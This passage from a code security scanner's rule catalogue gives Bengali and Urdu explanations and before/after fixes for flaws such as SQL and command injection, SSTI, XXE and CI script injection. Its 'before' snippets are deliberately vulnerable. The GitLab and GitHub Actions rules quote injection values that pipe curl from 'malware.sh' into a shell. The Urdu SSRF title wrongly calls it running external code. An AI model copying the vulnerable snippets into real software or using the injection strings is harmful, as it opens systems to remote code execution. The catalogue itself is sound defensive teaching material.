      '"permissions: write-all" ওয়ার্কফ্লোর GITHUB_TOKEN-কে সবকিছুতে — issue, pull request, package, deployment — write অ্যাক্সেস দেয়, এমনকি ওয়ার্কফ্লোটি এর শুধু একটি অংশ ব্যবহার করলেও। ওয়ার্কফ্লোর একটি ধাপ compromise হলে (একটি ক্ষতিকর ডিপেন্ডেন্সি, একটি ইনজেক্ট করা স্ক্রিপ্ট), সেই বিস্তৃত পারমিশনগুলো যে এটি exploit করে তার সক্ষমতা বাড়িয়ে দেয়।',
    fix: {
      before: `permissions: write-all`,
      after: `permissions:\n  contents: read\n  pull-requests: write  # শুধু যে পারমিশনগুলো ওয়ার্কফ্লো সত্যিই ব্যবহার করে`,
    },
  },
  "insecure-cookie-flags": {
    title: "একটি session বা authentication কুকি Secure ও HttpOnly ফ্ল্যাগ ছাড়াই সেট করা হয়",
    description:
      'session/auth/token-এর মতো নামের একটি কুকি তার অপশনগুলোর মধ্যে "httpOnly" ও "secure" ছাড়াই সেট করা হয়। httpOnly ছাড়া, পৃষ্ঠায় থাকা JavaScript — XSS দিয়ে ইনজেক্ট করা কোডসহ — সেই কুকি পড়তে পারে। secure ছাড়া, এটি একটি এনক্রিপ্ট না করা HTTP সংযোগেও পাঠানো যেতে পারে।',
    fix: {
      before: `res.cookie("session", sessionId)`,
      after: `res.cookie("session", sessionId, { httpOnly: true, secure: true, sameSite: "strict" })`,
    },
  },
  "no-login-rate-limit": {
    title: "লগইন ফর্ম একের পর এক অনেক চেষ্টা ব্লক করে না",
    description:
      "ফাইলে একটি লগইন রুট ডিফাইন করা আছে, কিন্তু একই ফাইলে rate-limiting মিডলওয়্যারের কোনো চিহ্ন নেই। চেষ্টার কোনো সীমা ছাড়া, একজন আক্রমণকারী কোনো বাধা ছাড়াই ধারাবাহিকভাবে পাসওয়ার্ড চেষ্টা করতে পারে (brute force)।",
    fix: {
      before: `router.post("/login", loginHandler)`,
      after: `import rateLimit from "express-rate-limit"\nconst loginLimiter = rateLimit({ windowMs: 15 * 60 * 1000, max: 5 })\nrouter.post("/login", loginLimiter, loginHandler)`,
    },
  },
  "sensitive-data-in-logs": {
    title: "পাসওয়ার্ড বা সংবেদনশীল ডেটা লগে চলে যায়",
    description:
      "console.log (বা অনুরূপ) একটি কলে password, token, secret, বা apiKey নামের একটি ভেরিয়েবল অন্তর্ভুক্ত থাকে। এই লগগুলো যদি কোনো বাহ্যিক সার্ভিসে বা ফাইলে চলে যায়, তাহলে সংবেদনশীল ডেটা প্রয়োজনের চেয়ে অনেক বেশি সময় ধরে উন্মুক্ত থাকে।",
    fix: {
      before: `console.log("login attempt", { email, password })`,
      after: `console.log("login attempt", { email })`,
    },
  },
  "docker-unpinned-base-image": {
    title: 'Dockerfile-এর base image ":latest" ট্যাগ ব্যবহার করে',
    description:
      'একটি FROM নির্দেশ একটি নির্দিষ্ট ভার্সনের বদলে স্পষ্টভাবে ":latest" ট্যাগ ব্যবহার করে। "latest" সময়ের সাথে পরিবর্তিত হয়: একই build, অন্য সময়ে আবার করা হলে, base image-এর একটি ভিন্ন ভার্সন পেতে পারে — একটি non-reproducible build, এবং কেউ সিদ্ধান্ত না নিয়েই একটি অবাঞ্ছিত আপডেট আসতে পারে।',
    fix: {
      before: `FROM node:latest`,
      after: `FROM node:20.11-slim`,
    },
  },
  "docker-add-remote-url": {
    title: "Dockerfile COPY-এর বদলে ADD দিয়ে একটি রিমোট ফাইল ডাউনলোড করে",
    description:
      "একটি http/https URL সহ ADD নির্দেশ build-এর সময় ইন্টারনেট থেকে একটি ফাইল ডাউনলোড করে, কোনো integrity যাচাই ছাড়াই এবং কন্টেন্ট রিপোজিটরিতে দৃশ্যমান না হয়েই। সেই URL যদি কখনো compromise হয়, build কেউ লক্ষ্য না করেই Dockerfile পড়ে নির্বিচারে কন্টেন্ট অন্তর্ভুক্ত করে।",
    fix: {
      before: `ADD https://example.com/install.sh /tmp/install.sh`,
      after: `RUN curl -fsSL https://example.com/install.sh -o /tmp/install.sh \\\n    && echo "<প্রত্যাশিত hash>  /tmp/install.sh" | sha256sum -c -`,
    },
  },
  "vulnerable-dependency": (original) => ({
    title: original.title.replace("Dipendenza vulnerabile:", "ঝুঁকিপূর্ণ ডিপেন্ডেন্সি:"),
    description: original.description,
    fix: {
      before: original.fix.before,
      after: original.fix.after.replace(
        "Nessuna versione corretta nota ancora — valuta un pacchetto alternativo o segui gli aggiornamenti del progetto.",
        "এখনো কোনো সংশোধিত ভার্সন জানা নেই — একটি বিকল্প প্যাকেজ বিবেচনা করুন অথবা প্রজেক্টের আপডেট অনুসরণ করুন।"
      ),
    },
  }),
    "gitlab-ci-script-injection": {
      title: 'GitLab CI পাইপলাইনে একটি বাহ্যিক ব্যবহারকারীর নিয়ন্ত্রিত মান দ্বিতীয় শেলের মধ্য দিয়ে যায়',
      description: 'একটি "script:" লাইন (বা "before_script:"/"after_script:") "eval" বা "sh -c"/"bash -c" ব্যবহার করে একটি GitLab প্রিডিফাইন্ড ভেরিয়েবলের সাথে, যেমন মার্জ রিকোয়েস্টের শিরোনাম, কমিট মেসেজ বা ব্রাঞ্চের নাম — এগুলো যে কেউ মার্জ রিকোয়েস্ট খুলে লিখতে পারে, এমনকি একটি বাহ্যিক ফর্ক থেকেও। মানটি প্রথমে বাহ্যিক শেল দ্বারা এক্সপ্যান্ড হয়, তারপর এমন একটি স্ট্রিংয়ে বসানো হয় যা দ্বিতীয় শেল আবার কোড হিসেবে পড়ে: "$(curl malware.sh | sh)" এর মতো একটি শিরোনাম পাইপলাইনে যেকোনো কমান্ড চালিয়ে দেবে, সেই জবে উপলব্ধ সব সিক্রেটের অ্যাক্সেস সহ।',
      fix: {
        before: `script:
  - bash -c "deploy.sh $CI_MERGE_REQUEST_TITLE"`,
        after: `script:
  - deploy.sh "$CI_MERGE_REQUEST_TITLE"  # কমান্ডের আর্গুমেন্ট হিসেবে পাঠানো হয়েছে, কখনোই "bash -c" স্ট্রিংয়ের ভেতরে নয় যা এটি আবার পার্স করবে`,
      },
    },
    "gitlab-ci-privileged-dind-no-tls": {
      title: 'GitLab CI পাইপলাইনে Docker-in-Docker TLS এনক্রিপশন বন্ধ রেখে চলছে',
      description: 'জবটি "docker:dind" সার্ভিস (Docker-in-Docker, পাইপলাইনের ভেতরে ইমেজ তৈরি করতে প্রয়োজনীয়) ব্যবহার করে কিন্তু "DOCKER_TLS_CERTDIR" একটি খালি স্ট্রিং-এ সেট করে, যা Docker ক্লায়েন্ট ও dind ডিমনের মধ্যে TLS এনক্রিপশন সম্পূর্ণ বন্ধ করে দেয়। TLS ছাড়া, রানারের একই অভ্যন্তরীণ নেটওয়ার্কে সেই পোর্টে পৌঁছাতে পারে এমন যে কেউ — শুধু সেই জবে সীমাবদ্ধ না থেকে — বর্ধিত সুবিধাসহ চলা Docker ডিমনকে নিয়ন্ত্রণ করতে পারে।',
      fix: {
        before: `services:
  - docker:dind
variables:
  DOCKER_TLS_CERTDIR: ""`,
        after: `services:
  - docker:dind
variables:
  DOCKER_TLS_CERTDIR: "/certs"  # Docker ক্লায়েন্ট ও dind ডিমনের মধ্যে TLS চালু থাকে — "" এটি সম্পূর্ণ বন্ধ করে দেয়`,
      },
    },
    "gitlab-ci-unpinned-image": {
      title: 'GitLab CI পাইপলাইনের Docker ইমেজ কোনো নির্দিষ্ট ভার্সনে ফিক্সড নয়',
      description: 'পাইপলাইনের "image:" কোনো ট্যাগ ছাড়া ইমেজের দিকে নির্দেশ করে (যা ":latest" এর সমতুল্য) অথবা স্পষ্টভাবে ":latest" এর দিকে। যে এই ইমেজ মেইনটেইন করে সে যেকোনো সময় রিপোজিটরি পরিবর্তন না করেই এর কন্টেন্ট বদলে দিতে পারে — একই পাইপলাইন এক দিন থেকে পরের দিন ভিন্ন কোড চালানো শুরু করতে পারে, যা কমিটের বদলে ট্যাগ দিয়ে রেফারেন্স করা GitHub Action-এর মতোই একটি সাপ্লাই চেইন ঝুঁকি।',
      fix: {
        before: `image: node:latest`,
        after: `image: node:20.11.1  # "latest" এর বদলে একটি নির্দিষ্ট ট্যাগ (বা আরও ভালো একটি ডাইজেস্ট "node@sha256:...")`,
      },
    },
},
  ur: {
  "supabase-service-role-in-client": {
    title: "Supabase کی سیکریٹ کی (secret key) ایسے حصے میں پہنچ جاتی ہے جو براؤزر کے لیے بنایا گیا ہے",
    description:
      "عوامی prefix والا (مثلاً NEXT_PUBLIC_، VITE_) کوئی variable یا کلائنٹ سائیڈ کی کوئی فائل Supabase کی service role key کا حوالہ دیتی ہے۔ یہ کی Row Level Security کو bypass کر دیتی ہے: اگر یہ براؤزر کے bundle میں پہنچ جائے تو کوئی بھی اسے پڑھ کر ڈیٹا بیس پر ایڈمنسٹریٹر کی طرح کام کر سکتا ہے۔",
    fix: {
      before: `// components/Dashboard.tsx\nconst supabase = createClient(url, process.env.NEXT_PUBLIC_SUPABASE_SERVICE_ROLE_KEY)`,
      after: `// app/api/admin/route.ts (صرف سرور)\nconst supabase = createClient(url, process.env.SUPABASE_SERVICE_ROLE_KEY)`,
    },
  },
  "hardcoded-secret": {
    title: "کوڈ میں براہ راست پاس ورڈز یا سیکریٹ کیز لکھی ہوئی ہیں",
    description:
      "کوئی API key، ٹوکن یا پاس ورڈ environment variable سے پڑھنے کے بجائے براہ راست لفظی قدر کے طور پر لکھا ہوا معلوم ہوتا ہے۔ جو بھی سورس کوڈ (یا، اگر عوامی ہو تو، ریپوزٹری) پڑھے گا، اسے وہ راز مل جائے گا۔",
    fix: {
      before: `const apiKey = "sk_live_51H8x9K2eZvKYlo2C..."`,
      after: `const apiKey = process.env.STRIPE_SECRET_KEY`,
    },
  },
  "env-file-with-real-values": {
    title: "پراجیکٹ کے اصل پاس ورڈز والی ایک فائل بھی تجزیہ کی جانے والی فائلوں میں شامل ہے",
    description:
      "اصل قدروں والی ایک .env فائل (نہ کہ .env.example) تجزیے میں شامل ہے۔ اگر یہ فائل کسی ریپوزٹری یا عوامی deploy میں چلی جائے تو اس میں موجود تمام credentials بے نقاب ہو جاتے ہیں۔",
    fix: {
      before: `# .env (غلطی سے commit کی گئی)\nDATABASE_URL=postgres://user:realpassword@db.host/prod`,
      after: `# .env.example (commit کی گئی)\nDATABASE_URL=postgres://user:password@localhost/dev\n\n# .env ریپو سے باہر رہتی ہے (.gitignore)`,
    },
  },
  "missing-row-level-security": {
    title: "کوئی بھی تمام صارفین کا ڈیٹا پڑھ یا تبدیل کر سکتا ہے",
    description:
      "Row Level Security غیر فعال ہے، یا کوئی policy یہ چیک کیے بغیر کہ درخواست کون کر رہا ہے، ہر کسی کو رسائی دیتی ہے (USING (true))۔ ہر authenticated صارف — یا یہاں تک کہ anonymous بھی — باقی سب کا ڈیٹا پڑھ یا تبدیل کر سکتا ہے۔",
    fix: {
      before: `ALTER TABLE public.orders DISABLE ROW LEVEL SECURITY;`,
      after: `ALTER TABLE public.orders ENABLE ROW LEVEL SECURITY;\nCREATE POLICY "owners only" ON public.orders\n  USING (auth.uid() = user_id);`,
    },
  },
  "sql-injection": {
    title: "صارف کی درج کردہ کوئی قدر براہ راست ڈیٹا بیس کی query میں چسپاں کر دی جاتی ہے",
    description:
      "ایک SQL query، parameters استعمال کرنے کے بجائے، کسی string کو براہ راست جوڑ کر (concatenate) یا interpolate کر کے بنائی جاتی ہے۔ اگر وہ متن (بالواسطہ ہی سہی) کسی صارف سے آتا ہے، تو وہ خود query کو بدل سکتا ہے — SQL injection۔",
    fix: {
      before: "db.query(`SELECT * FROM users WHERE email = '${email}'`)",
      after: `db.query("SELECT * FROM users WHERE email = $1", [email])`,
    },
  },
  "plaintext-password-storage": {
    title: "پاس ورڈز محفوظ نہیں معلوم ہوتے",
    description:
      "پاس ورڈ کا فیلڈ بالکل ویسے ہی محفوظ کیا جاتا ہے جیسے درخواست میں آیا تھا، اور فائل میں کوئی hashing فنکشن (bcrypt، argon2، scrypt) نظر نہیں آتا۔ اگر ڈیٹا بیس compromise ہو جائے تو تمام پاس ورڈز فوری طور پر قابلِ استعمال ہوں گے۔",
    fix: {
      before: `await db.users.insert({ email, password: req.body.password })`,
      after: `const hashed = await bcrypt.hash(req.body.password, 12)\nawait db.users.insert({ email, password: hashed })`,
    },
  },
  "hardcoded-jwt-secret": {
    title: "لاگ ان sign کرنے کے لیے استعمال ہونے والا secret کوڈ میں صاف الفاظ میں لکھا ہوا ہے",
    description:
      "jwt.sign / jwt.verify کو دیا جانے والا secret (یا JWT_SECRET variable) environment variable سے آنے کے بجائے کوڈ میں لفظی قدر ہے۔ جو بھی اسے پڑھے گا وہ کسی بھی صارف کے لیے valid access token بنا سکتا ہے۔",
    fix: {
      before: `jwt.sign(payload, "super-secret-key-123")`,
      after: `jwt.sign(payload, process.env.JWT_SECRET)`,
    },
  },
  "command-injection": {
    title: "سرور کو بیرونی کمانڈز چلانے پر مجبور کیا جا سکتا ہے",
    description:
      "سسٹم کمانڈز چلانے والا فنکشن (exec، execSync، spawn) ایسی string وصول کرتا ہے جو interpolation یا concatenation سے بنائی گئی ہو۔ اگر اس string کا کوئی حصہ صارف کے input سے آتا ہے، تو جو اسے کنٹرول کرے وہ سرور پر من چاہی کمانڈز چلوا سکتا ہے۔",
    fix: {
      before: "execSync(`convert ${filename} output.png`)",
      after: `execFile("convert", [filename, "output.png"])`,
    },
  },
  "path-traversal": {
    title: "سرور پر موجود کوئی فائل باہر سے path منتخب کر کے پڑھی یا لکھی جا سکتی ہے",
    description:
      'کوئی فائل پڑھنے، لکھنے یا بھیجنے والا فنکشن اس کا path براہ راست درخواست کی کسی قدر (query، body، params) سے لیتا ہے، یہ چیک کیے بغیر کہ وہ اجازت یافتہ فولڈر کے اندر ہی رہے۔ کوئی حملہ آور "../" شامل کر کے متوقع فولڈر سے باہر نکل سکتا ہے اور سرور پر کوئی بھی فائل پڑھ یا overwrite کر سکتا ہے (مثلاً credentials والی configuration فائل)۔',
    fix: {
      before: `app.get("/download", (req, res) => {\n  res.sendFile(req.query.file)\n})`,
      after: `const ALLOWED_DIR = path.resolve("./uploads")\napp.get("/download", (req, res) => {\n  const target = path.resolve(ALLOWED_DIR, req.query.file)\n  if (!target.startsWith(ALLOWED_DIR)) return res.status(400).send("راستہ اجازت یافتہ نہیں")\n  res.sendFile(target)\n})`,
    },
  },
  "nosql-injection": {
    title: "صارف کی درج کردہ قدر MongoDB کی query کے اندر کوڈ کے طور پر چلا دی جاتی ہے",
    description:
      "MongoDB کا $where operator ہر document کے لیے سرور کی طرف JavaScript چلاتا ہے — اگر وہ string صارف سے آنے والی قدر جوڑ کر بنائی گئی ہو، تو جو اسے کنٹرول کرے وہ ڈیٹا بیس کے context میں من چاہا کوڈ چلوا سکتا ہے، نہ کہ صرف عام SQL injection کی طرح filter بدل سکتا ہے۔",
    fix: {
      before: `db.collection.find({ $where: "this.username == '" + username + "'" })`,
      after: `db.collection.find({ username: username })`,
    },
  },
  ssti: {
    title: "صارف کی درج کردہ قدر کو ڈیٹا کے بجائے ایک template سمجھ لیا جاتا ہے",
    description:
      "template compile/run کرنے والا فنکشن مکمل template درخواست کی کسی قدر سے وصول کرتا ہے، بجائے اس کے کہ ایک fixed template استعمال ہو اور صرف ڈیٹا پاس کیا جائے۔ کوئی حملہ آور براہ راست template engine کی syntax میں لکھ سکتا ہے (مثلاً Jinja2 کے لیے {{7*7}}) اور سرور پر کوڈ چلا سکتا ہے — Server-Side Template Injection، جو اکثر محض XSS جیسے ڈسپلے مسئلے کے بجائے من چاہی کمانڈز کے execution تک لے جاتا ہے۔",
    fix: {
      before: `return render_template_string(request.args.get("name"))`,
      after: `return render_template("profile.html", name=request.args.get("name"))`,
    },
  },
  xxe: {
    title: "XML parser کو فائلیں پڑھنے یا بیرونی درخواستیں بھیجنے پر مجبور کیا جا سکتا ہے",
    description:
      "ایک XML parser (DocumentBuilderFactory) قریبی سطور میں بیرونی entities (DOCTYPE) کو واضح طور پر غیر فعال کیے بغیر بنایا جاتا ہے۔ اگر parser کسی غیر معتبر ذریعے سے XML وصول کرے، تو حملہ آور ایک external entity define کر کے سرور پر فائلیں پڑھ سکتا ہے یا اسے اپنی مرضی کے پتے سے رابطہ کروا سکتا ہے — XML External Entity۔",
    fix: {
      before: `DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\nDocumentBuilder builder = factory.newDocumentBuilder();`,
      after: `DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\nfactory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);\nDocumentBuilder builder = factory.newDocumentBuilder();`,
    },
  },
  "docker-hardcoded-secret": {
    title: "Dockerfile کی کسی ENV یا ARG instruction میں براہ راست کوئی راز لکھا ہوا ہے",
    description:
      "password/secret/token/key جیسے نام والی کوئی variable ENV یا ARG instruction میں لفظی قدر رکھتی ہے۔ .env فائل کے برعکس (جو عموماً image میں شامل نہیں ہوتی)، یہ قدر خود Docker image میں شامل ہو جاتی ہے — جو بھی اسے pull کرے یا layer history دیکھے وہ اسے حاصل کر سکتا ہے، چاہے Dockerfile کے بعد والے ورژن میں وہ سطر ہٹا بھی دی جائے۔",
    fix: {
      before: `ENV DB_PASSWORD=supersecret123`,
      after: `ARG DB_PASSWORD\nENV DB_PASSWORD=$DB_PASSWORD\n# یوں پاس کیا جاتا ہے: docker build --build-arg DB_PASSWORD=*** (یا، بہتر ہے کہ\n# BuildKit کا secret mount استعمال کریں، جو layer history میں شامل نہیں ہوتا)`,
    },
  },
  "k8s-privileged-container": {
    title: "Kubernetes manifest کا ایک container privileged کے طور پر چل رہا ہے",
    description:
      'container کے securityContext میں "privileged: true" container اور host کے درمیان عام طور پر موجود تقریباً تمام isolation ختم کر دیتا ہے: container host کے devices تک رسائی حاصل کر سکتا ہے، اس کی network configuration بدل سکتا ہے، اور کئی صورتوں میں چلانے والی مشین پر عملاً root رسائی حاصل کر سکتا ہے۔ ایک عام ایپ کے لیے تقریباً کبھی ضروری نہیں ہوتا۔',
    fix: {
      before: `securityContext:\n  privileged: true`,
      after: `securityContext:\n  privileged: false\n  capabilities:\n    add: ["NET_BIND_SERVICE"]  # صرف واقعی ضروری capabilities`,
    },
  },
  "k8s-plaintext-secret-env": {
    title: "Kubernetes manifest کی env variable میں کوئی راز صاف الفاظ میں لکھا ہوا ہے",
    description:
      'password/secret/token/key جیسے نام والی ایک environment variable، Secret ("valueFrom.secretKeyRef") سے پڑھنے کے بجائے لفظی قدر ("value:") رکھتی ہے۔ manifest خود — جو اکثر کسی ریپوزٹری میں commit کی جاتی ہے — اس طرح راز کو صاف الفاظ میں رکھتی ہے، جو اس شخص کو بھی نظر آتا ہے جو صرف configuration پڑھ سکتا ہو، ضروری نہیں کہ cluster میں کمانڈز چلا سکے۔',
    fix: {
      before: `env:\n  - name: DB_PASSWORD\n    value: supersecret123`,
      after: `env:\n  - name: DB_PASSWORD\n    valueFrom:\n      secretKeyRef:\n        name: db-credentials\n        key: password`,
    },
  },
  "terraform-open-security-group": {
    title: "Terraform کا کوئی security group ایک حساس پورٹ پورے انٹرنیٹ کے لیے کھول دیتا ہے",
    description:
      'ایک rule جس کے "cidr_blocks" میں 0.0.0.0/0 (کوئی بھی IP ایڈریس) شامل ہو، کسی حساس پورٹ کے قریب ہے — SSH (22)، RDP (3389)، یا ڈیٹا بیس کی کوئی عام پورٹ (MySQL، Postgres، MongoDB، Redis، SQL Server)۔ انٹرنیٹ پر کوئی بھی اس سروس سے جڑنے کی کوشش کر سکتا ہے، نہ کہ صرف وہ جسے اجازت ہونی چاہیے۔',
    fix: {
      before: `ingress {\n  from_port   = 22\n  to_port     = 22\n  protocol    = "tcp"\n  cidr_blocks = ["0.0.0.0/0"]\n}`,
      after: `ingress {\n  from_port   = 22\n  to_port     = 22\n  protocol    = "tcp"\n  cidr_blocks = ["10.0.0.0/16"]  # صرف آپ کا private نیٹ ورک، یا کوئی bastion host\n}`,
    },
  },
  "gcp-firewall-open-to-internet": {
    title: "Google Cloud کا کوئی firewall rule ایک حساس پورٹ پورے انٹرنیٹ کے لیے کھول دیتا ہے",
    description:
      'ایک "google_compute_firewall" resource، جس کے "source_ranges" میں 0.0.0.0/0 (کوئی بھی IP ایڈریس) شامل ہو، کسی حساس پورٹ کی طرف ٹریفک کی اجازت دیتا ہے — SSH (22)، RDP (3389)، یا ڈیٹا بیس کی کوئی عام پورٹ (MySQL، Postgres، MongoDB، Redis، SQL Server)۔ انٹرنیٹ پر کوئی بھی اس سروس سے جڑنے کی کوشش کر سکتا ہے، نہ کہ صرف وہ جسے اجازت ہونی چاہیے۔',
    fix: {
      before: `resource "google_compute_firewall" "allow-ssh" {\n  allow {\n    protocol = "tcp"\n    ports    = ["22"]\n  }\n  source_ranges = ["0.0.0.0/0"]\n}`,
      after: `resource "google_compute_firewall" "allow-ssh" {\n  allow {\n    protocol = "tcp"\n    ports    = ["22"]\n  }\n  source_ranges = ["10.0.0.0/16"]  # صرف آپ کا private نیٹ ورک، یا کوئی bastion host\n}`,
    },
  },
  "azure-nsg-open-to-internet": {
    title: "Azure کا کوئی network rule ایک حساس پورٹ پورے انٹرنیٹ کے لیے کھول دیتا ہے",
    description:
      'ایک network security rule ("azurerm_network_security_rule"، یا "azurerm_network_security_group" کے اندر "security_rule" بلاک) جس کا "source_address_prefix" "*" یا "0.0.0.0/0" ہو، سمت "Inbound" اور رسائی "Allow" ہو، کسی حساس پورٹ کے قریب ہے — SSH (22)، RDP (3389)، یا ڈیٹا بیس کی کوئی عام پورٹ۔ انٹرنیٹ پر کوئی بھی اس سروس سے جڑنے کی کوشش کر سکتا ہے، نہ کہ صرف وہ جسے اجازت ہونی چاہیے۔',
    fix: {
      before: `resource "azurerm_network_security_rule" "allow-ssh" {\n  direction              = "Inbound"\n  access                 = "Allow"\n  destination_port_range = "22"\n  source_address_prefix  = "*"\n}`,
      after: `resource "azurerm_network_security_rule" "allow-ssh" {\n  direction              = "Inbound"\n  access                 = "Allow"\n  destination_port_range = "22"\n  source_address_prefix  = "10.0.0.0/16"  # صرف آپ کا private نیٹ ورک، یا کوئی bastion host\n}`,
    },
  },
  "terraform-hardcoded-secret": {
    title: "Terraform کی کسی variable کی default قدر کے طور پر کوئی راز لکھا ہوا ہے",
    description:
      'password/secret/token/key جیسے نام والی ایک variable کے "default" میں لفظی قدر موجود ہے۔ runtime پر پاس کی جانے والی قدر (tfvars، TF_VAR_* environment variables) کے برعکس، default سورس کوڈ میں ہی رہ جاتا ہے — اور اگر ریپوزٹری shared یا عوامی ہو، تو کوئی بھی اسے دیکھ سکتا ہے، Terraform state تک رسائی کے بغیر بھی۔',
    fix: {
      before: `variable "db_password" {\n  default = "supersecret123"\n}`,
      after: `variable "db_password" {\n  # کوئی default نہیں: اسے .tfvars فائل (git سے باہر) یا TF_VAR_db_password environment variable کے ذریعے پاس کریں\n  sensitive = true\n}`,
    },
  },
  "gha-script-injection": {
    title: "کسی بیرونی صارف کے کنٹرول کردہ قدر براہ راست CI کے shell کمانڈ میں داخل ہو جاتی ہے",
    description:
      'GitHub Actions workflow کا کوئی "run:" کمانڈ براہ راست کوئی قدر interpolate کرتا ہے، جیسے pull request کا عنوان، branch کا نام، یا کسی comment کا متن — یہ سب وہ شخص لکھ سکتا ہے جو کوئی pull request یا comment کھولے، چاہے وہ کسی بیرونی fork سے ہی کیوں نہ ہو۔ `"; curl malware.sh | sh #` جیسی قدر CI میں من چاہی کمانڈز چلا دے گی، اس workflow میں دستیاب تمام راز تک رسائی کے ساتھ۔',
    fix: {
      before: `- run: echo "\${{ github.event.pull_request.title }}"`,
      after: `- env:\n    PR_TITLE: \${{ github.event.pull_request.title }}\n  run: echo "$PR_TITLE"  # environment variable کے طور پر پاس کیا گیا، کبھی بھی کمانڈ میں براہ راست interpolate نہیں کیا گیا`,
    },
  },
  "gha-pull-request-target-checkout": {
    title: "Workflow کسی بیرونی pull request کا کوڈ ریپوزٹری کے رازوں تک رسائی کے ساتھ چلاتا ہے",
    description:
      'یہ workflow "pull_request_target" استعمال کرتا ہے — جو کسی اجنبی fork سے کھولی گئی pull request کے لیے بھی base ریپوزٹری کے permissions اور رازوں کے ساتھ چلتا ہے — اور خود pull request کے کوڈ ("github.event.pull_request.head") کا checkout کرتا ہے، نہ کہ base branch کا۔ جو شخص pull request کھولتا ہے وہ عملاً اپنا کوڈ ان رازوں تک رسائی کے ساتھ چلوا لیتا ہے۔',
    fix: {
      before: `on:\n  pull_request_target:\njobs:\n  build:\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          ref: \${{ github.event.pull_request.head.sha }}`,
      after: `on:\n  pull_request_target:\njobs:\n  build:\n    steps:\n      # base branch کا checkout کریں، نہ کہ PR کے کوڈ کا — یا اگر وسیع\n      # permissions/راز درکار نہیں تو "pull_request_target" کی بجائے\n      # "pull_request" استعمال کریں۔\n      - uses: actions/checkout@v4`,
    },
  },
  "insecure-deserialization": {
    title: "درخواست کا ڈیٹا ایسے format میں deserialize کیا جاتا ہے جو کوڈ چلا سکتا ہے",
    description:
      "pickle (Python)، unserialize() (PHP)، ObjectInputStream (Java) یا node-serialize لائبریری (Node) درخواست سے براہ راست لی گئی کسی قدر کو deserialize کر رہے ہیں۔ JSON کے برعکس، یہ formats deserialization کے دوران ہی کوڈ کو represent اور execute کر سکتے ہیں — جو بھیجی گئی قدر کو کنٹرول کرے وہ سرور پر من چاہا کوڈ چلوا سکتا ہے۔",
    fix: {
      before: `data = pickle.loads(request.data)`,
      after: `import json\ndata = json.loads(request.data)  # JSON پارسنگ کے دوران کبھی کوڈ نہیں چلاتا، pickle کے برعکس`,
    },
  },
  "jwt-none-algorithm": {
    title: 'کوڈ واضح طور پر بغیر sign کیے JWT ٹوکنز کو قبول کرتا ہے (الگورتھم "none")',
    description:
      '"none" JWT ٹوکن verify کرنے کے لیے قبول شدہ الگورتھمز میں شامل ہے۔ "none" الگورتھم والے ٹوکن کے پاس verify کرنے کے لیے کوئی sign موجود نہیں ہوتا: کوئی بھی کسی بھی مواد کے ساتھ (مثلاً ایک ایڈمن role) ایسا ٹوکن بنا سکتا ہے اور کوڈ اسے valid مان لے گا۔',
    fix: {
      before: `jwt.verify(token, secret, { algorithms: ["HS256", "none"] })`,
      after: `jwt.verify(token, secret, { algorithms: ["HS256"] })  // قبول شدہ الگورتھمز میں کبھی "none" شامل نہ کریں`,
    },
  },
  "unprotected-new-table": {
    title: "کوئی نئی ٹیبل بغیر کسی تحفظ کے بنائی گئی معلوم ہوتی ہے",
    description:
      "ایک SQL migration ٹیبل بناتی ہے لیکن اسی فائل میں اسی ٹیبل کے لیے Row Level Security فعال نہیں کرتی۔ جب تک یہ ایسے ہی رہے، ٹیبل اس پابندی کے بغیر وجود میں آتی ہے کہ اسے کون پڑھ یا لکھ سکتا ہے۔",
    fix: {
      before: `CREATE TABLE public.invoices (\n  id uuid PRIMARY KEY,\n  user_id uuid REFERENCES auth.users\n);`,
      after: `CREATE TABLE public.invoices (\n  id uuid PRIMARY KEY,\n  user_id uuid REFERENCES auth.users\n);\nALTER TABLE public.invoices ENABLE ROW LEVEL SECURITY;`,
    },
  },
  "permissive-cors": {
    title: "یہ سائٹ کسی بھی دوسری ویب سائٹ سے آنے والی درخواستیں قبول کرتی ہے",
    description:
      "CORS header کسی بھی origin (*) سے درخواستیں قبول کرنے کے لیے سیٹ ہے، یا cors() middleware بغیر کسی پابندی کے استعمال ہو رہا ہے۔ کوئی بھی third-party ویب سائٹ، پہلے سے authenticated صارف کے براؤزر سے، آپ کی APIs کو کال کر سکتی ہے۔",
    fix: {
      before: `app.use(cors())`,
      after: `app.use(cors({ origin: ["https://yoursite.com"] }))`,
    },
  },
  "admin-function-missing-auth": {
    title: "ایڈمن permissions والا ایک فنکشن یہ چیک نہیں کرتا کہ اسے کون استعمال کر رہا ہے",
    description:
      "ایک route یا فنکشن جس کا نام ایڈمن آپریشنز کی طرف اشارہ کرتا ہے، قریبی سطور میں کوئی authentication یا role چیک نہیں رکھتا۔ جو بھی اس کا URL جانتا ہو وہ اسے چلا سکتا ہے۔",
    fix: {
      before: `router.post("/admin/delete-user", async (req, res) => {\n  await db.users.delete(req.body.id)\n})`,
      after: `router.post("/admin/delete-user", requireAuth, requireRole("admin"), async (req, res) => {\n  await db.users.delete(req.body.id)\n})`,
    },
  },
  ssrf: {
    title: "سائٹ کو بیرونی کوڈ چلانے پر مجبور کیا جا سکتا ہے",
    description:
      "ایک outgoing HTTP درخواست (fetch، axios) صارف کی درخواست سے آنے والی قدر کو براہ راست منزل کے URL کے طور پر استعمال کرتی ہے۔ کوئی بدنیت صارف آپ کے سرور سے اندرونی یا من چاہے پتے کال کروا سکتا ہے — Server-Side Request Forgery۔",
    fix: {
      before: `const data = await fetch(req.query.url)`,
      after: `const ALLOWED = new Set(["https://api.yourservice.com"])\nif (!ALLOWED.has(req.query.url)) throw new Error("URL کی اجازت نہیں")\nconst data = await fetch(req.query.url)`,
    },
  },
  "weak-password-hashing": {
    title: "پاس ورڈز اب ایک ایسے طریقے سے محفوظ ہیں جسے توڑنا آسان ہو چکا ہے",
    description:
      "ایک ہی سطر میں، md5() یا sha1() کسی پاس ورڈ سے جڑی قدر پر لاگو کیے جاتے ہیں۔ یہ الگورتھمز حساب کرنے میں بہت تیز ہیں: ڈیٹا بیس رکھنے والا حملہ آور فی سیکنڈ اربوں پاس ورڈز آزما سکتا ہے۔",
    fix: {
      before: `const hashed = crypto.createHash("md5").update(password).digest("hex")`,
      after: `const hashed = await bcrypt.hash(password, 12)`,
    },
  },
  "k8s-run-as-root": {
    title: "Kubernetes manifest کا ایک container root کے طور پر چلنے کے لیے سیٹ ہے",
    description:
